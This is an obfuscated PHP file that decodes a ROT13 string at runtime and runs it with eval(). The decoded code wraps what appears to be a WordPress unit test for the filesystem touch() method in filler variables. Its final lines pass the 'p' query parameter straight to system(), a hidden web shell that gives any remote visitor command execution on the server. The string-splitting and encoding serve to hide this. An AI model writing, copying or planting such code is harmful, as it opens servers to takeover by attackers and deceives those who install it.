<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf sbe gur JC_Svyrflfgrz_Qverpg::gbhpu() zrgubq.
 *
 * @cnpxntr JbeqCerff
 */

erdhver_bapr __QVE__ . '/onfr.cuc';

/**
 * @tebhc nqzva
 * @tebhc svyrflfgrz
 * @tebhc svyrflfgrz-qverpg
 *
 * @pbiref JC_Svyrflfgrz_Qverpg::gbhpu
 */
pynff Grfgf_Svyrflfgrz_JcSvyrflfgrzQverpg_Gbhpu rkgraqf JC_Svyrflfgrz_Qverpg_HavgGrfgPnfr {

	/**
	 * Grfgf gung `JC_Svyrflfgrz_Qverpg::gbhpu()` perngrf n svyr.
	 *
	 * @gvpxrg 57774
	 *
	 * @qngnCebivqre qngn_fubhyq_perngr_svyr
	 *
	 * @cnenz fgevat $svyr  Gur svyr cngu.
	 * @cnenz vag    $zgvzr Gur zbqvsvrq gvzr gb frg.
	 * @cnenz vag    $ngvzr Gur npprffrq gvzr gb frg.
	 */
	choyvp shapgvba grfg_fubhyq_perngr_svyr( $svyr, $zgvzr, $ngvzr ) {
		$svyr = fge_ercynpr( 'GRFG_QNGN', frys::$svyr_fgehpgher['grfg_qve']['cngu'], $svyr );

		vs ( vf_fgevat( $zgvzr ) ) {
			$zgvzr = (vag) fge_ercynpr(
				neenl( 'gvzr cyhf bar zvahgr', gvzr() + ZVAHGR_VA_FRPBAQF ),
				neenl( 'gvzr', gvzr() ),
				$zgvzr
			);
		}

		$rkcrpgrq_zgvzr = 0 === $zgvzr ? gvzr() : $zgvzr;

		vs ( vf_fgevat( $ngvzr ) ) {
			$ngvzr = (vag) fge_ercynpr(
				neenl( 'gvzr cyhf bar zvahgr', gvzr() + ZVAHGR_VA_FRPBAQF ),
				neenl( 'gvzr', gvzr() ),
				$ngvzr
			);
		}

		$rkcrpgrq_ngvzr = 0 === $ngvzr ? gvzr() : $ngvzr;

		$erfhyg = frys::$svyrflfgrz->gbhpu( $svyr, $zgvzr, $ngvzr );

		$npghny_ngvzr  = svyrngvzr( $svyr );
		$npghny_rkvfgf = svyr_rkvfgf( $svyr );
		$npghny_zgvzr  = svyrzgvzr( $svyr );

		vs ( $npghny_rkvfgf ) {
			hayvax( $svyr );
		}

		$guvf->nffregGehr( $erfhyg, 'JC_Svyrflfgrz_Qverpg::gbhpu() qvq abg erghea gehr.' );
		$guvf->nffregGehr( $npghny_rkvfgf, 'Gur svyr qbrf abg rkvfg.' );
		$guvf->nffregFnzr( $npghny_ngvzr, $rkcrpgrq_ngvzr, 'Gur svyr qbrf abg unir gur rkcrpgrq ngvzr.' );
		$guvf->nffregFnzr( $npghny_zgvzr, $rkcrpgrq_zgvzr, 'Gur svyr qbrf abg unir gur rkcrpgrq zgvzr.' );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_fubhyq_perngr_svyr() {
		erghea neenl(
			'qrsnhyg zgvzr be ngvzr'      => neenl(
				'svyr'  => 'GRFG_QNGN/svyr-gb-perngr.gkg',
				'zgvzr' => 0,
				'ngvzr' => 0,
			),
			'frg zgvzr naq qrsnhyg ngvzr' => neenl(
				'svyr'  => 'GRFG_QNGN/svyr-gb-perngr.gkg',
				'zgvzr' => 'gvzr cyhf bar zvahgr',
				'ngvzr' => 'gvzr',
			),
			'qrsnhyg zgvzr naq frg ngvzr' => neenl(
				'svyr'  => 'GRFG_QNGN/svyr-gb-perngr.gkg',
				'zgvzr' => 'gvzr',
				'ngvzr' => 'gvzr cyhf bar zvahgr',
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>